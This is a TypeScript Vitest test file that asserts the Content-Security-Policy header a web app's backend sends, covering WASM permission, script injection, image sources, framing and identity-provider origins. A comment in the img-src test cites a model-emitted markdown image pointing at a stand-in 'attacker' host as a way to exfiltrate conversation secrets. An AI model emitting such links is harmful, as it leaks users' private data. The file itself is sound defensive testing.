/**
 * The Content-Security-Policy the BFF sends, asserted directive by directive.
 *
 * `buildCsp` had no test of any kind. `tests/serverConfig.test.ts` is fourteen good cases about
 * `AUTH_MODE` and loopback binding, and its base fixture sets `csp: ''` — so the string that
 * decides whether chemistry renders at all, and whether the XSS defence holds, was produced by one
 * function and read by nobody.
 *
 * Three breakages this closes, each of which left the whole suite green and each of which fails
 * **only in the container** — Vite's dev server serves `index.html` itself and never sends this
 * header, so `:5173` cannot show you any of them:
 *
 *  - dropping `'wasm-unsafe-eval'`: RDKit and Ketcher's Indigo worker both refuse to instantiate,
 *    every structure falls to the "could not render" box and the sketcher dies on first use;
 *  - adding `'unsafe-inline'` to `script-src`: the reason `/config.js` is a real same-origin file
 *    rather than an inline tag, and the reason `renderConfigScript` escapes `<`, both evaporate;
 *  - the policy growing an origin for the identity provider: the browser holds no token and never
 *    talks to it (sign-in is a top-level navigation), so every auth mode sends the same header and
 *    any widening is a regression.
 *
 * Driven through `cfg.csp` after a fresh import rather than by exporting `buildCsp`, because the
 * property worth pinning is what this process will actually *send* for a given environment — a
 * helper asserted in isolation would still pass if `cfg` stopped calling it.
 */

import { afterEach, describe, expect, it, vi } from 'vitest';

/** `directive -> its values`, parsed from the header the BFF would send under `env`. */
async function csp(env: Record<string, string> = {}): Promise<Map<string, string[]>> {
  for (const [key, value] of Object.entries(env)) vi.stubEnv(key, value);
  vi.resetModules();
  const { cfg } = await import('../server/config.ts');
  const parsed = new Map<string, string[]>();
  for (const chunk of cfg.csp.split(';')) {
    const [name, ...values] = chunk.trim().split(/\s+/);
    if (name) parsed.set(name, values);
  }
  return parsed;
}

const BFF = {
  AUTH_MODE: 'bff',
  ENTRA_TENANT_ID: 't',
  ENTRA_CLIENT_ID: 'c',
  ENTRA_CLIENT_SECRET: 's',
  API_SCOPE: 'api://c/Chat.Access',
  APP_ORIGIN: 'https://app.example',
};

afterEach(() => {
  vi.unstubAllEnvs();
  vi.resetModules();
});

describe('script execution', () => {
  it.each([
    ['dev', {}],
    ['bff', BFF],
  ])('permits WASM and nothing else in %s mode', async (_mode, env) => {
    const directives = await csp(env);
    const scriptSrc = directives.get('script-src') ?? [];

    // Present: the narrow token that lets `WebAssembly.instantiate` run. It appears in exactly one
    // place in this repository — the source that produces it — so nothing else can notice its loss.
    expect(scriptSrc, 'RDKit and Ketcher cannot instantiate without this').toContain(
      "'wasm-unsafe-eval'",
    );
    // Absent: the two tokens that would re-open script injection. `wasm-unsafe-eval` deliberately
    // does neither, which is the whole reason a separate token exists.
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).not.toContain("'unsafe-eval'");
    expect(scriptSrc).toContain("'self'");
  });

  it.each([
    ['dev', {}],
    ['bff', BFF],
  ])('pins img-src to local sources only in %s mode', async (_mode, env) => {
    // The last line of defence against conversation exfiltration via a model-emitted
    // `![](https://attacker/?q=<secret>)`. `Markdown.tsx` refuses to render an external `<img>`
    // at all, but this directive is what stops one that slips past it (or any other component)
    // from ever reaching the network. No remote host is permitted; `data:` and `blob:` are the
    // page's own inlined/minted images. Pinned in both auth modes because neither branch touches
    // it — a widening here would be silent otherwise.
    expect(await csp(env).then((d) => d.get('img-src'))).toEqual(["'self'", 'data:', 'blob:']);
  });

  it('states worker-src, which does not fall back to script-src', async () => {
    // Browsers that implement `worker-src` do NOT fall back to `script-src` for it, so an omitted
    // directive is not "inherit" — Ketcher's Indigo worker simply fails on the first operation.
    expect((await csp()).get('worker-src')).toEqual(["'self'"]);
  });

  it('leaves nowhere for an injected object or a rewritten base href', async () => {
    const directives = await csp();
    expect(directives.get('object-src')).toEqual(["'none'"]);
    expect(directives.get('base-uri')).toEqual(["'none'"]);
  });
});

describe('the identity provider', () => {
  it('is not an origin the page may talk to, frame or post to, in any auth mode', async () => {
    // The BFF does the whole exchange, so the policy stays closed — and a login host appearing
    // here would mean a script on the page can reach it.
    for (const env of [{}, BFF, { ...BFF, ENTRA_AUTHORITY: 'https://login.example/tenant' }]) {
      const directives = await csp(env);
      expect(directives.get('connect-src')).toEqual(["'self'"]);
      expect(directives.get('frame-src')).toEqual(["'none'"]);
      expect(directives.get('form-action')).toEqual(["'self'"]);
      const everything = [...directives.values()].flat().join(' ');
      expect(everything).not.toMatch(/microsoftonline|login\.example/);
    }
  });
});

describe('framing', () => {
  it('is refused unless a deployment opts in', async () => {
    // A dev-mode UI requires no sign-in and opens every authorization gate, so it is the
    // deployment that can least afford to be clickjacked. `ALLOW_FRAMING` is the one knob.
    expect((await csp()).get('frame-ancestors')).toEqual(["'none'"]);
    expect((await csp(BFF)).get('frame-ancestors')).toEqual(["'none'"]);
  });

  it('is permitted when the deployment says so', async () => {
    expect((await csp({ ALLOW_FRAMING: 'true' })).get('frame-ancestors')).toEqual(['*']);
  });
});

/**
 * The header, byte for byte: one literal, and the same in every auth mode. Any drift — a reordered
 * directive, a doubled space, an origin that should not be there — fails here rather than in a
 * browser.
 */
describe('the default header', () => {
  const DEFAULT_CSP =
    "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
    "connect-src 'self'; frame-src 'none'; form-action 'self'; base-uri 'none'; " +
    "frame-ancestors 'none'; object-src 'none'";

  async function header(env: Record<string, string>): Promise<string> {
    for (const [key, value] of Object.entries(env)) vi.stubEnv(key, value);
    vi.resetModules();
    return (await import('../server/config.ts')).cfg.csp;
  }

  it.each([
    ['dev', {}],
    ['bff', BFF],
    ['bff with its own authority', { ...BFF, ENTRA_AUTHORITY: 'https://127.0.0.1:8443/entra/t' }],
  ])('is the same literal in %s mode', async (_mode, env) => {
    expect(await header(env)).toBe(DEFAULT_CSP);
  });
});
